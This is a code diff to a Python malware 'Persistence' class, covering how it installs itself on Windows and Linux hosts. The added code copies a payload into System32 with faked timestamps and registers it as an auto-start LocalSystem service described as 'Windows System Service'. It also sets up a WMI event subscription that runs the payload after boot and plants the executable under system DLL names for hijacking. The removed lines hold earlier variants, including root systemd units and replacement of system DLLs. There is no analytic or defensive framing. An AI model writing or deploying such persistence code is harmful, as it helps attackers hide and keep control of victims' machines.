@@ -181,63 +181,41 @@ class Persistence:
         return False
         
     def install_service(self, executable_path: str) -> bool:
-        """Enhanced service installation"""
-        success = False
-        service_name = self._generate_random_name("svc")
-        
+        """Install as a Windows service"""
         try:
-            if os.name == 'nt':  # Windows
-                # Try multiple service types
-                service_types = [
-                    ('own', 'SERVICE_WIN32_OWN_PROCESS'),
-                    ('share', 'SERVICE_WIN32_SHARE_PROCESS'),
-                    ('kernel', 'SERVICE_KERNEL_DRIVER')
-                ]
-                
-                for svc_type, _ in service_types:
-                    try:
-                        cmd = f'sc create "{service_name}" binPath= "{executable_path}" type= {svc_type} start= auto'
-                        result = subprocess.run(cmd, shell=True, capture_output=True)
-                        if result.returncode == 0:
-                            # Set recovery options
-                            subprocess.run(f'sc failure "{service_name}" reset= 0 actions= restart/60000/restart/60000/restart/60000', shell=True)
-                            success = True
-                            break
-                    except:
-                        continue
-                        
-            else:  # Unix-like
-                service_content = f'''[Unit]
-Description=System Management Service
-After=network.target
-StartLimitIntervalSec=0
-
-[Service]
-Type=simple
-ExecStart={executable_path}
-Restart=always
-RestartSec=1
-User=root
-
-[Install]
-WantedBy=multi-user.target
-'''
-                
-                try:
-                    service_path = f"/etc/systemd/system/{service_name}.service"
-                    with open(service_path, 'w') as f:
-                        f.write(service_content)
-                    subprocess.run(['systemctl', 'daemon-reload'])
-                    subprocess.run(['systemctl', 'enable', service_name])
-                    success = True
-                except Exception as e:
-                    self.logger.error(f"Failed to create service: {str(e)}")
-                    
-        except Exception as e:
-            self.logger.error(f"Service installation failed: {str(e)}")
+            service_name = self._generate_random_name("Svc")
+            display_name = self._generate_random_name("Service")
             
-        self.installed_methods[PersistenceMethod.SERVICE] = success
-        return success
+            # Copy executable to system directory
+            system32 = os.path.join(os.environ['SystemRoot'], 'System32')
+            service_exe = os.path.join(system32, f"{service_name}.exe")
+            
+            if self._copy_with_timestamp(executable_path, service_exe):
+                # Create service with minimal permissions
+                subprocess.run([
+                    'sc', 'create',
+                    service_name,
+                    'binPath=', service_exe,
+                    'start=', 'auto',
+                    'obj=', 'LocalSystem',
+                    'type=', 'own'
+                ], capture_output=True)
+                
+                # Set description
+                subprocess.run([
+                    'sc', 'description',
+                    service_name,
+                    '"Windows System Service"'
+                ], capture_output=True)
+                
+                # Start service
+                subprocess.run(['sc', 'start', service_name], capture_output=True)
+                
+                return True
+        except:
+            return False
+            
+        return False
         
     def install_scheduled_task(self, executable_path: str) -> bool:
         """Install persistence via scheduled tasks"""
@@ -273,68 +251,71 @@ WantedBy=multi-user.target
         return success
         
     def install_wmi(self, executable_path: str) -> bool:
-        """Install persistence via WMI event subscription"""
-        if os.name != 'nt':
+        """Install WMI event consumer persistence"""
+        try:
+            import wmi
+            import win32com.client
+            
+            # Connect to WMI
+            w = wmi.WMI()
+            
+            # Create a new event filter
+            filter_name = self._generate_random_name("WMIFilter")
+            consumer_name = self._generate_random_name("WMIConsumer")
+            binding_name = self._generate_random_name("WMIBinding")
+            
+            # Query for system startup
+            query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+            
+            # Create filter
+            filter_path = w.Win32_EventFilter.Create(
+                Name=filter_name,
+                EventNamespace='root\\cimv2',
+                QueryLanguage='WQL',
+                Query=query
+            )
+            
+            # Create consumer
+            consumer_path = w.Win32_CommandLineEventConsumer.Create(
+                Name=consumer_name,
+                CommandLineTemplate=executable_path
+            )
+            
+            # Bind them together
+            w.Win32_FilterToConsumerBinding.Create(
+                Filter=filter_path.Path_(),
+                Consumer=consumer_path.Path_()
+            )
+            
+            return True
+        except:
             return False
             
-        success = False
+    def install_dll_hijack(self, executable_path: str) -> bool:
+        """Implement DLL hijacking persistence"""
         try:
-            # Create WMI event subscription
-            namespace = "\\\\.\\root\\subscription"
-            query = f'''
-            SELECT * FROM __InstanceModificationEvent WITHIN 60
-            WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
-            '''
-            
-            cmd = f'''powershell -Command "$filter = Set-WmiInstance -Class __EventFilter -Namespace '{namespace}' -Arguments @{{
-                Name = '{self._generate_random_name("evt")}';
-                EventNameSpace = 'root\\Cimv2';
-                QueryLanguage = 'WQL';
-                Query = '{query}'
-            }};
-            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace '{namespace}' -Arguments @{{
-                Name = '{self._generate_random_name("cmd")}';
-                ExecutablePath = '{executable_path}';
-                CommandLineTemplate = '{executable_path}'
-            }};
-            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace '{namespace}' -Arguments @{{
-                Filter = $filter;
-                Consumer = $consumer
-            }};"'''
-            
-            result = subprocess.run(cmd, shell=True, capture_output=True)
-            success = result.returncode == 0
-            
-        except Exception as e:
-            self.logger.error(f"WMI persistence failed: {str(e)}")
-            
-        self.installed_methods[PersistenceMethod.WMI] = success
-        return success
-        
-    def _install_dll_hijack(self, executable_path: str) -> bool:
-        """Install persistence via DLL hijacking"""
-        if os.name != 'nt':
-            return False
-            
-        try:
-            # Common DLL hijacking targets
+            # Common DLL hijack targets
             dll_targets = [
-                "C:\\Windows\\System32\\wbem\\wbemcomn.dll",
-                "C:\\Windows\\System32\\Windows.Storage.dll",
-                "C:\\Windows\\System32\\cryptbase.dll"
+                'winmm.dll',
+                'uxtheme.dll',
+                'cryptsp.dll',
+                'apphelp.dll'
             ]
             
-            for target in dll_targets:
-                try:
-                    if os.path.exists(target):
-                        backup_path = target + '.bak'
-                        if not os.path.exists(backup_path):
-                            os.rename(target, backup_path)
-                        shutil.copy2(executable_path, target)
-                        return True
-                except:
-                    continue
-                    
+            system_dirs = [
+                os.environ['SystemRoot'],
+                os.path.join(os.environ['SystemRoot'], 'System32'),
+                os.path.join(os.environ['SystemRoot'], 'SysWOW64')
+            ]
+            
+            for dll in dll_targets:
+                for dir_path in system_dirs:
+                    dll_path = os.path.join(dir_path, dll)
+                    if not os.path.exists(dll_path):
+                        # Copy our executable as the DLL
+                        if self._copy_with_timestamp(executable_path, dll_path):
+                            return True
+                            
             return False
         except:
             return False
@@ -395,7 +376,7 @@ WantedBy=multi-user.target
             self.install_service,
             self.install_scheduled_task,
             self.install_wmi,
-            self._install_dll_hijack
+            self.install_dll_hijack
         ]
         
         for method in methods:
